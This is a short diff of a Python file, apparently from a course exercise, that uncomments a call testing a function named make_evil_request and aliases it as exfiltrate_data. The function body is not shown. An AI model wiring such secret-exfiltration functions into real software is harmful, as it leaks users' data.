@@ -48,9 +48,10 @@ def make_evil_request(secret_data: str) -> Optional[str]:
         return None
 
 
-"""import w1d2_test
+import w1d2_test
+
 w1d2_test.test_make_evil_request(make_evil_request)
-exfiltrate_data = make_evil_request"""
+exfiltrate_data = make_evil_request
 
 
 if __name__ == "__main__":  # Only executed when running the script directly
